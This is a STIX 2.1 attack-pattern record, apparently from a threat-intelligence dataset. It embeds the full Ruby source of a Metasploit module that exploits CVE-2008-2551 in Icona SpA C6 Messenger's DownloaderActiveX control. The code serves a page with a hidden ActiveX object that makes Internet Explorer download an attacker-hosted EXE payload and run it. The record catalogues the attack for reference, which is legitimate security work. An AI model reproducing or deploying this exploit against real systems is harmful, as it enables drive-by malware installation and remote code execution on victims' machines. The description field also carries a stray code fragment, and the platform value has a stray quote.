{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23804a05-32e6-4e6a-96f7-681f58b5e19c",
    "created": "2024-08-14T16:43:03.058258Z",
    "modified": "2024-08-14T16:43:03.058263Z",
    "name": "Icona SpA C6 Messenger DownloaderActiveX Control Arbitrary File Download and Execute",
    "description": " This module exploits a vulnerability in Icona SpA C6 Messenger 1.0.0.1. The vulnerability is in the DownloaderActiveX Control (DownloaderActiveX.ocx). The insecure control can be abused to download and execute arbitrary files in the context of the currently logged-on user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/c6_messenger_downloaderactivex.rb",
            "external_id": "c6_messenger_downloaderactivex.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2551"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Icona SpA C6 Messenger DownloaderActiveX Control Arbitrary File Download and Execute',\n      'Description'    => %q{\n          This module exploits a vulnerability in Icona SpA C6 Messenger 1.0.0.1. The\n        vulnerability is in the DownloaderActiveX Control (DownloaderActiveX.ocx). The\n        insecure control can be abused to download and execute arbitrary files in the context of\n        the currently logged-on user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', # Nine:Situations:Group::SnoopyAssault, vulnerability discovery and exploit\n          'juan vazquez' # metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-2551' ],\n          [ 'OSVDB', '45960' ],\n          [ 'BID', '29519' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'         => \"none\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DisclosureDate' => '2008-06-03',\n      'DefaultTarget'  => 0,\n      'Privileged'     => false))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    # Only IEs are potential targets\n    # \"File Session\" is used when the ActiveX tries to request the EXE\n    agent = request.headers['User-Agent']\n    if agent !~ /MSIE \\d\\.\\d|File Session/\n      print_error(\"Target not supported: #{agent}\")\n      return\n    end\n\n    payload_url =  \"http://\"\n    payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    payload_url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/#{@payload_rand}\"\n\n    if (request.uri.match(/#{@payload_rand}/))\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      print_status(\"Sending EXE payload\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    exe = rand_text_alpha(rand(5) + 1 )\n\n    content = %Q|\n    <html>\n      <object id=\"DownloaderActiveX1\" width=\"0\" height=\"0\" classid=\"CLSID:c1b7e532-3ecb-4e9e-bb3a-2951ffe67c61\" codebase=\"DownloaderActiveX.cab#Version=1,0,0,1\">\n        <param name=\"propProgressBackground\"  value=\"#bccee8\">\n        <param name=\"propTextBackground\"  value=\"#f7f8fc\">\n        <param name=\"propBarColor\"  value=\"#df0203\">\n        <param name=\"propTextColor\"  value=\"#000000\">\n        <param name=\"propWidth\"  value=\"0\">\n        <param name=\"propHeight\"  value=\"0\">\n        <param name=\"propDownloadUrl\"  value=\"#{payload_url}/#{exe}.exe\">\n        <param name=\"propPostDownloadAction\"  value=\"run\">\n        <param name=\"propInstallCompleteUrl\"  value=\"\">\n        <param name=\"propBrowserRedirectUrl\"  value=\"\">\n        <param name=\"propVerbose\"  value=\"0\">\n        <param name=\"propInterrupt\"  value=\"0\">\n      </OBJECT>\n    </html>\n    |\n\n    print_status(\"Sending #{self.name}\")\n\n    send_response_html(cli, content)\n\n    handler(cli)\n\n  end\n\n  def exploit\n    @payload_rand = rand_text_alpha(rand(5) + 5 )\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-06-03",
    "x_mitre_platforms": [
        "win'"
    ]
}